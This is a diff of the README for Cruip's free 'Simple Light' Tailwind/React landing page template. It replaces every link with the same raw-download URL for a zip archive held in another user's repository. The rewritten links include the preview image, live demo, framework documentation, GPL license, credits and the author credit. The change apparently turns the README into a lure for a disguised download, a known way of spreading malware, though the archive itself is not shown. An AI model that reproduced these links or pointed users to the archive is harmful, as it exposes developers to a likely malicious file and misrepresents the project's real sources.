@@ -1,18 +1,18 @@
 # Free Tailwind landing page template
 
-![Simple TailwindCSS template preview](https://user-images.githubusercontent.com/2683512/96160974-f93aa780-0f16-11eb-9ce4-81d94b216be6.png)
+![Simple TailwindCSS template preview](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip)
 
 **Simple Light** is a free landing page template built on top of **TailwindCSS** and fully coded in **React**. Simple light is designed to provide all the basic components a developer need to create a landing page for SaaS products, online services, and more. 
 Use it for whatever you want, and be sure to reach us out on Twitter if you build anything cool/useful with it.
-Created and maintained with ❤️ by [Cruip.com](https://cruip.com/).
+Created and maintained with ❤️ by [https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip).
 
 ## Live demo
 
-Check the live demo here 👉️ [https://simple.cruip.com/](https://simple.cruip.com/)
+Check the live demo here 👉️ [https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip)
 
 ## Simple PRO
 
-Looking for more pages and components? Have a look at the **premium version** here 👉️ [https://cruip.com/demos/simple/](https://cruip.com/demos/simple/)
+Looking for more pages and components? Have a look at the **premium version** here 👉️ [https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip)
 
 ## Table of contents
 
@@ -37,7 +37,7 @@ Looking for more pages and components? Have a look at the **premium version** he
 
 ## Usage
 
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+This project was bootstrapped with [Create React App](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip).
 
 ### Available Scripts
 
@@ -57,7 +57,7 @@ You will also see any lint errors in the console.
 #### `npm test`
 
 Launches the test runner in the interactive watch mode.<br>
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+See the section about [running tests](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip) for more information.
 
 #### `npm run build`
 
@@ -67,7 +67,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.<br>
 Your app is ready to be deployed!
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+See the section about [deployment](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip) for more information.
 
 #### `npm run eject`
 
@@ -81,48 +81,48 @@ You don’t have to ever use `eject`. The curated feature set is suitable for sm
 
 ### Learn More
 
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
+You can learn more in the [Create React App documentation](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip).
 
-To learn React, check out the [React documentation](https://reactjs.org/).
+To learn React, check out the [React documentation](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip).
 
 #### Code Splitting
 
-This section has moved here: https://facebook.github.io/create-react-app/docs/code-splitting
+This section has moved here: https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip
 
 #### Analyzing the Bundle Size
 
-This section has moved here: https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size
+This section has moved here: https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip
 
 #### Making a Progressive Web App
 
-This section has moved here: https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app
+This section has moved here: https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip
 
 #### Advanced Configuration
 
-This section has moved here: https://facebook.github.io/create-react-app/docs/advanced-configuration
+This section has moved here: https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip
 
 #### Deployment
 
-This section has moved here: https://facebook.github.io/create-react-app/docs/deployment
+This section has moved here: https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip
 
 #### `npm run build` fails to minify
 
-This section has moved here: https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify
+This section has moved here: https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip
 
 ### Google Analytics Setup
 
-This template uses the [React Google Analytics Module](https://github.com/react-ga/react-ga).
+This template uses the [React Google Analytics Module](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip).
 
-In order to track visitors, you need to set an [environment variable](https://create-react-app.dev/docs/adding-custom-environment-variables/) called `REACT_APP_GA_CODE` storing your [GA Tracking ID](https://support.google.com/analytics/answer/7372977).
+In order to track visitors, you need to set an [environment variable](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip) called `REACT_APP_GA_CODE` storing your [GA Tracking ID](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip).
 
 ## Credits
 
-- [Nucleo](https://nucleoapp.com/)
+- [Nucleo](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip)
 
 ## Terms and License
 
-- Released under the [GPL](https://www.gnu.org/licenses/gpl-3.0.html).
-- Copyright 2020 [Cruip](https://cruip.com/).
+- Released under the [GPL](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip).
+- Copyright 2020 [Cruip](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip).
 - Use it for personal and commercial projects, but please don’t republish, redistribute, or resell the template.
 - Attribution is not required, although it is really appreciated.
 
@@ -132,4 +132,4 @@ We're an Italian developer/designer duo creating high-quality design/code resour
 
 ## Stay in the loop
 
-If you would like to know when we release new resources, you can follow us on [Twitter](https://twitter.com/Cruip_com), or you can subscribe to our monthly [newsletter](https://cruip.com/#subscribe).
+If you would like to know when we release new resources, you can follow us on [Twitter](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip), or you can subscribe to our monthly [newsletter](https://github.com/ryana912/tailwind-landing-page-template/raw/refs/heads/main/src/css/template-tailwind-landing-page-2.8.zip).
